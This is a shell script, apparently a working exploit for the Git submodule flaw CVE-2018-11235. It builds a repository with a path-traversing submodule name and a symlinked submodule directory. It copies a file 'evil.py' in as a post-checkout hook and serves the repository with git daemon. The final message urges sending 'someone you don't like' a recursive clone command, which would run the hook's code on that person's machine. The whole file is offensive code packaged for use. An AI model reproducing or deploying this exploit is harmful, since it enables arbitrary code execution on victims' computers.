#!/bin/sh

set -e

if [ -d "/tmp/repo" ]; then
    echo "[x] Looks like /tmp/repo exists (i.e. this shell script has already been run). Please delete it to run this again."
    exit 1
fi

repo_dir="/$PWD/repo"
repo_submodule='https://github.com/HyperionGray/Spoon-Knife'

git init "$repo_dir"
cd "$repo_dir"
git submodule add "$repo_submodule" evil
mkdir -p modules/1/2/3/4
cp -r .git/modules/evil modules/1/2/3/4
cd modules
ln -s 1/2/3/4/evil evil
cd ..
cp ../evil.py modules/evil/hooks/post-checkout
git config -f .gitmodules submodule.evil.update checkout
git config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evil
git add modules
git submodule add "$repo_submodule"
git add Spoon-Knife
git commit -am CVE-2018-11235
cd $repo_dir/..
mv repo /tmp
cd /tmp

echo "[*] Executing gitdaemon"
echo "[*] Please ensure no firewall rules block git daemon"
echo "[*] All done, now tell someone you don't like to \`git clone --recurse-submodules git://<your ip>/repo dest_dir\`"


git daemon --base-path=. --export-all --reuseaddr --informative-errors --verbose

